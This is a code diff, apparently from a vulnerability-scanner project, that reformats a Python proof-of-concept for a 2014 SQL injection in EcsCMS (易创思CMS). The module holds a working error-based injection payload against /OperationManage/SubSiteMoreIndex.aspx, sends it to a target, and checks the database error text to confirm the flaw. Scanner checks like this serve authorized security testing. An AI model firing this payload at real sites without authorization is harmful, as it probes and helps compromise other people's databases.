@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'EcsCMS_0001' # 平台漏洞编号，留空
+    vuln_id = 'EcsCMS_0001'  # 平台漏洞编号，留空
     name = '易创思CMS 通用sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-09-27'  # 漏洞公布时间
     desc = '''
         EcsCMS(易创思CMS) /OperationManage/SubSiteMoreIndex.aspx 通用SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'EcsCMS(易创思CMS)'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '9ef67c1a-6cd1-441b-aa28-cc0366e57daa'
@@ -30,12 +32,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #ref http://wooyun.org/bugs/wooyun-2014-077491
+
+            # ref http://wooyun.org/bugs/wooyun-2014-077491
             payload = '/OperationManage/SubSiteMoreIndex.aspx?pkId=511&subSiteId=256&kw=Xasd%25%27%20and%201=db_name%281%29--&st=1&t=1'
             verify_url = self.target + payload
             req = requests.get(verify_url)
-            
+
             if req.status_code == 500 and 'master' in req.content and 'nvarchar' in req.content and 'int' in req.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -45,6 +47,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
